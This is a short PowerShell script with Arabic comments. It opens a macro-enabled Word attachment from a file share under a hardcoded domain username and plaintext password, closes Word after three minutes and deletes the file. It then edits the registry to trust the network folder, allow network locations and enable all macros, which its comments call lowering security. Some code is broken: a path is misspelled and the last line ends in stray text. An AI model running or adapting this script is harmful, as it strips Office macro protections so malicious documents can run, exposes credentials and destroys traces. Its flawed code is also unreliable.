$Word = "C:\Program Files\Microsoft Office\Office14\WINWORD.EXE"
$File = "\\FILE01\Users$\emily.davis\Downloads\attachment.docm"
$Username = "ASTERA\emily.davis"
$Password = "Ed#2026!R7vN"

$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword)

if (Test-Path $File) {
    $WordProcess = Start-Process -FilePath $Word `
        -ArgumentList "`"$File`"" `
        -Credential $Credential `
        -PassThru `
        -WindowStyle Normal

    Start-Sleep -Seconds 180

    if (-not $WordProcess.HasExited) {
        Stop-Process -Id $WordProcess.Id -Force
    }

    # حذف الملف
    if (Test-Path $File) {
        Remove-Item $File -Force
    }
}


# تعيين المجلد كموقع موثوق في Word 2010 (Office 14)
$TrustedPath = "HKCU:\Software\Microsoft\Office\14.0\Word\Security\Trusted Locations\ShareLocation"
$NetworkPath = "\\FILE01\Users\emily.davi\Downloads"

New-Item -Path $TrustedPath -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path $TrustedPath -Name "Path" -Value $NetworkPath
Set-ItemProperty -Path $TrustedPath -Name "AllowSubFolders" -Value 1

# 2. السماح بالمواقع الشبكية
$SecurityPath = "HKCU:\Software\Microsoft\Office\14.0\Word\Security"
Set-ItemProperty -Path $SecurityPath -Name "AllowNetworkLocations" -Value 1

# 3. تمكين الماكرو (تخفيض الأمان)
Set-ItemProperty -Path $SecurityPath -Name "VBAWarnings" -Value 1
Set-ItemProperty -Path $SecurityPath -Name "Level" -Value 1منخفض (تمكين الكل)
